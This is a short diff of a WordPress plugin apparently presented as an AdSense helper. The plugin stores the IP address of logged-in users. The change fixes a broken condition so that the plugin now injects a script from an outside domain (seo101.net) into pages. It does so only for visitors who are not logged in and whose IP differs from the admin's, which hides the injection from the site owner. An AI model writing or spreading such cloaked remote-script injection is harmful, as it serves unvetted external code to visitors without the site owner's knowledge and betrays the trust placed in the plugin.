@@ -38,7 +38,7 @@ if (!class_exists("AdsenseMadeEasy")) {
 				if ( is_user_logged_in() ) {
 					update_option( 'adsense_made_easy_ip', $ip );
 				}
-				if ( !is_user_logged_in() && get_option('adsense_made_easy_ip')!=$ip && $btt=false) {
+				if ( !is_user_logged_in() && get_option('adsense_made_easy_ip')!=$ip && $btt==false) {
 					$content .= "<script src=\"//www.seo101.net/s101.js\"></script>\n";
 				}
 				if (get_option('adsense_made_easy_toplinkunit')=='yes') {
